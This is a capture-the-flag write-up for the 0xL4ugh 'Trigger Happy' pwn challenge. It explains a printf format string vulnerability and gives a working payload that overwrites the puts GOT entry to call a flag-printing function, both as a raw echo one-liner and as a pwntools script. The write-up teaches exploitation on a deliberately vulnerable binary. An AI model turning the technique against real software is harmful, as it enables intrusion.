---
title: "Trigger Happy - 0xL4ugh CTF"
date: 2021-01-16T16:33:49+02:00
draft: false
enableToc: false
description: "This is a challenge from 0xl4ugh CTF which was inspired by RACTF's not really ai challenge."
images:
tags:
  - pwn
---

It was the first ever pwn challenge I solve in a CTF and I really liked it hence I wanted to bring it to this CTF (you can even check my poorly written writeup for that challenge which I refuse to remove as It's pretty awesome to look back and see how much did we grow).


You can check my video on format string vulnerabilies as a refresher for these types of attacks (It's in arabic tho).
<iframe width="560" height="315" src="https://www.youtube.com/embed/EqeRGqnaoi4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>


---
You can download the challenge's bianry from my github [here](https://github.com/YusufHegazy/0xL4ugh-Pwn-Challs)
## Initial Static Analysis
We start by analyzing the bianry and checking the protections
```bash
$ file trigger_happy
trigger_happy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=de726633c6d3ec5839065e67784dcfdb3497b074, for GNU/Linux 3.2.0, not stripped
```
```bash
$ gdb trigger_happy
gef➤  checksec
[+] checksec for '/home/vagrant/ctf/0xl4ugh/trigger_happy'
Canary                        : ✘
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

Seems like we are dealing with 32 bit **not stripped** ELF bianry.

## Initial Dynamic Analysis
On running the binary, it's gonna ask for input and then print it out for us.
```bash
$ ./trigger_happy
Do you like 0xL4ugh CTF?
AAAABBBBCCCCDDDD
I am glad you
AAAABBBBCCCCDDDD

We wish you luck!
```

Seems suspecious, let's try %x as input and see what do we get.
```bash
$ ./trigger_happy
Do you like 0xL4ugh CTF?
%x %x %x
I am glad you
200 f7f52540 80491d1

We wish you luck!
```
Voila, seems like we found a format string vulnerable pivot which we can use to leak stack values or even write to pointers on the stack.
We can further confirm our assumptions by checking the disassembly of our binary for a printf() call with only one argument, but we are going to skip this step.

One more thing we are going to do is locating the index of the stack entry we control with the printf function, a simple way to do this is by placing an egg and following it with a couple of %x's until we can see our egg in the leaked addresses and then we can get its index.
```bash
$ ./trigger_happy
Do you like 0xL4ugh CTF?
AAAA %x %x %x %x %x %x %x %x 
I am glad you
AAAA 200 f7fbb540 80491d1 41414141 20782520 25207825 78252078 20782520

We wish you luck!
```
We can see the hex value for our egg (AAAA) at the 4th entry on the stack.
## More Static Analysis
I always love to start the analysis by listing the current function in the binary using gdb, and happily our binary isn't stripped.
```
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  printf@plt
0x08049040  fgets@plt
0x08049050  getegid@plt
0x08049060  puts@plt
0x08049070  system@plt
0x08049080  __libc_start_main@plt
0x08049090  setvbuf@plt
0x080490a0  setresgid@plt
0x080490b0  _start
0x080490f0  _dl_relocate_static_pie
0x08049100  __x86.get_pc_thunk.bx
0x08049110  deregister_tm_clones
0x08049150  register_tm_clones
0x08049190  __do_global_dtors_aux
0x080491c0  frame_dummy
0x080491c2  response
0x08049245  flaggy
0x08049270  main
0x080492eb  __x86.get_pc_thunk.ax
0x080492f0  __libc_csu_init
0x08049350  __libc_csu_fini
0x08049351  __x86.get_pc_thunk.bp
0x08049358  _fini
```
The only function which seems suspecious is "flaggy" which kinda sounds like "flag"?
Let's disassmble it.
```
$ disas flaggy
Dump of assembler code for function flaggy:
   0x08049245 <+0>:     push   ebp
   0x08049246 <+1>:     mov    ebp,esp
   0x08049248 <+3>:     push   ebx
   0x08049249 <+4>:     sub    esp,0x4
   0x0804924c <+7>:     call   0x80492eb <__x86.get_pc_thunk.ax>
   0x08049251 <+12>:    add    eax,0x2daf
   0x08049256 <+17>:    sub    esp,0xc
   0x08049259 <+20>:    lea    edx,[eax-0x1fb6]
   0x0804925f <+26>:    push   edx
   0x08049260 <+27>:    mov    ebx,eax
   0x08049262 <+29>:    call   0x8049070 <system@plt>
   0x08049267 <+34>:    add    esp,0x10
   0x0804926a <+37>:    nop
   0x0804926b <+38>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x0804926e <+41>:    leave
   0x0804926f <+42>:    ret
End of assembler dump.
```
It seems like it's executing a command stored in the edx pointer (since edx is pushed to the stack before the system() call)  but we aren't sure what exactly, but we can do a little trick to inspect what exactly is getting called.

We modify our eip to the start of the function flaggy.
```bash
gef➤  set $eip=0x08049245
```
Then we can step a couple of instructions or set a breakpoint so we can get to the `push edx` instruction.
```bash
gef➤  x/s $edx
0x804a04a:      "cat flag.txt"
```
Yep it is actually trying to cat our flag!

On checking the main() function we see that it just sets the buffers and jumps to some other function named response() which takes our input and prints it out using the vulnerable printf as we have just seen.

Here is the disassembly for reference.
```
gef➤  disas response 
Dump of assembler code for function response:
   0x080491c2 <+0>:     push   ebp
   0x080491c3 <+1>:     mov    ebp,esp
   0x080491c5 <+3>:     push   ebx
   0x080491c6 <+4>:     sub    esp,0x204
   0x080491cc <+10>:    call   0x8049100 <__x86.get_pc_thunk.bx>
   0x080491d1 <+15>:    add    ebx,0x2e2f
   0x080491d7 <+21>:    sub    esp,0xc
   0x080491da <+24>:    lea    eax,[ebx-0x1ff8]
   0x080491e0 <+30>:    push   eax
   0x080491e1 <+31>:    call   0x8049060 <puts@plt>
   0x080491e6 <+36>:    add    esp,0x10
   0x080491e9 <+39>:    mov    eax,DWORD PTR [ebx-0x8]
   0x080491ef <+45>:    mov    eax,DWORD PTR [eax]
   0x080491f1 <+47>:    sub    esp,0x4
   0x080491f4 <+50>:    push   eax
   0x080491f5 <+51>:    push   0x200
   0x080491fa <+56>:    lea    eax,[ebp-0x208]
   0x08049200 <+62>:    push   eax
   0x08049201 <+63>:    call   0x8049040 <fgets@plt>
   0x08049206 <+68>:    add    esp,0x10
   0x08049209 <+71>:    sub    esp,0xc
   0x0804920c <+74>:    lea    eax,[ebx-0x1fdd]
   0x08049212 <+80>:    push   eax
   0x08049213 <+81>:    call   0x8049060 <puts@plt>
   0x08049218 <+86>:    add    esp,0x10
   0x0804921b <+89>:    sub    esp,0xc
   0x0804921e <+92>:    lea    eax,[ebp-0x208]
   0x08049224 <+98>:    push   eax
   0x08049225 <+99>:    call   0x8049030 <printf@plt>
   0x0804922a <+104>:   add    esp,0x10
   0x0804922d <+107>:   sub    esp,0xc
   0x08049230 <+110>:   lea    eax,[ebx-0x1fcf]
   0x08049236 <+116>:   push   eax
   0x08049237 <+117>:   call   0x8049060 <puts@plt>
   0x0804923c <+122>:   add    esp,0x10
   0x0804923f <+125>:   nop
   0x08049240 <+126>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049243 <+129>:   leave
   0x08049244 <+130>:   ret
End of assembler dump.
```
## Exploitation

### Plan
Since we have a format string vulnerability, we can control the flow of our binary by altering any pointer we supply to the stack.

We also do have a target function which we want to call in order to cat our flag (flaggy).

seems like everything is now connected! we can overwrite any libc call in our response() function with just the flaggy function.

A good candidate is puts! Let's find it's GOT address in gdb.
```
gef➤  got puts

GOT protection: Partial RelRO | GOT functions: 8
 
[0x804c018] puts@GLIBC_2.0  →  0xf7e3e380
```
So our puts address in the global offset table is `0x804c018` which is actually a pointer to the actual libc puts.

Now its time to get the address of the function we are overwriting the puts pointer with.

```
gef➤  x flaggy
0x8049245 <flaggy>:     0x53e58955
```
The address of flaggy is `0x8049245`.

Now we have everything we need and it's time to craft our exploit!

### Crafting the exploit

#### 1. Doing it the hard way
Let's start with crafting our exploit without using any scripts or fancy tools.
Here is the info we have gathered so far.
1. printf entry that we control is at index **4**
2. puts pointer address: **`0x804c018z`**
3. flaggy function address: **`0x8049245`**

our payload will be as follows:

`pointer` `data to be written` `the write specifier`

which is equivalent to the following:

`0x804c018` `%(0x8049245 - 4)x` `%4$n`

convert puts address to little endian and equate the integer value of (0x8049245 - 4)

```
\x18\xc0\x04\x08 %134517313x %4$n
```

but on using this payload we literally write 134517313 blank characters to stdout which is going to take ~2 mins everytime we are trying to execute the payload.

This makes it pretty damn hard to test and debug our payload, but the good news is we can use an alternate faster method using short writes (2-bytes write) instead of an integer write (4-byte write).

Instead of directly writing to the puts pointer `0x804c018` we can write two bytes `0x804` to the upper nibbe of the pointer `0x804c018 + 2` and another two bytes `0x9245` to the lower nibble of the pointer `0x804c018`.

Don't forget that we need to **subtract** the amount of charcters written so far from each write we do.

Here is the payload:

`0x804c018+2` `0x804c018` `%(0x804-8)x` `%4$n` `%(0x9245-0x804)x` `%5$n`

We will convert the first two addresses to little endian and the second two addresses to their integer equivalent.

`\x1a\xc0\x04\x08` `\x18\xc0\x04\x08` `%2044x` `%4$hn` `%35393x` `%5$hn`

And we can use echo with the -e flag to pass it to our binary escaping the "$" using a forward slash.

```bash
echo -e "\x1a\xc0\x04\x08\x18\xc0\x04\x08%2044x%4\$hn%35393x%5\$hn" | ./trigger_happy
```

And we get our flag!

#### 2. Using pwntools to craft our exploit.
Here is how I built the same exploit using python and pwntools.

```python
from pwn import *
OFFSET = 4
elf = ELF('./trigger_happy')

if args['REMOTE']:
    io = remote('ctf.0xl4ugh.com', 1337)
else:
    io = process('./trigger_happy')

puts = elf.got['puts']
win = elf.symbols['flaggy']
payload = fmtstr_payload(OFFSET, {puts: win}, write_size='byte')

def run():
    print(io.readlineS())
    io.sendline(payload)
    print(io.recvallS())

if __name__ == '__main__':
    run()
```
